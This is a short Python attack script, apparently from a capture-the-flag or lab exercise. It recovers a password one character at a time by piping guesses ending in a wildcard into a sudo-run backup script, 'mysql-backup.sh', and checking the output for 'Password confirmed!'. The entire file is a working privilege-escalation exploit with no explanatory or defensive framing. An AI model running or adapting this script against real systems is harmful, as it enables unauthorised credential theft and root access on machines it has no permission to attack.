import string
import subprocess

def check_password(p):
    command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
    child = subprocess.run(command, shell=True, capture_output=True, text=True)

    if "Password confirmed!" in child.stdout:
        return True
    return False

characters = string.ascii_letters + string.digits
password = ""
found_end = False

print("[*] Brute-forcing password...")

while not found_end:
    for char in characters:
        if check_password(password + char):
            password += char
            print(f"[+] Found characters: {password}")
            break
    else:
        found_end = True

print(f"[*] Final Password: {password}")
